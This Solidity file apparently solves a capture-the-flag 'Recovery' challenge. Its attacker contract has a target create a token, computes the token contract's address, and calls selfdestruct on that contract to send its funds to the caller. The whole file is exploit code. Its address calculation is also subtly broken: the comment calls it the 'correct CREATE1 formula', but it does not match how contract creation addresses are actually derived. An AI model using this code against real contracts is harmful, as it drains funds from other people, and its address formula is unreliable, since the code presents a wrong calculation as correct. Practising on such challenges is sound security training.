pragma solidity ^0.8.0;

interface IRecovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

contract SimpleToken {
    function destroy(address payable _to) external {
        selfdestruct(_to);
    }
}

contract AddressAttacker {
    IRecovery immutable recovery;

    constructor(address _recovery) {
        recovery = IRecovery(_recovery);
    }

    function exploit() external {
        // Generate new token
        recovery.generateToken("exploitToken", 1000000);

        // Calculate first token address with correct CREATE1 formula
        address tokenAddress = toAddress(
            keccak256(abi.encodePacked(
                bytes1(0x00), 
                bytes12(0), 
                recovery, 
                uint64(1) // first token created from Recovery
            ))
        );

        // Destroy the token contract and send funds
        SimpleToken(tokenAddress).destroy(payable(msg.sender));
    }

    function toAddress(bytes32 hash) private pure returns (address) {
        return address(uint160(uint256(hash)));
    }
}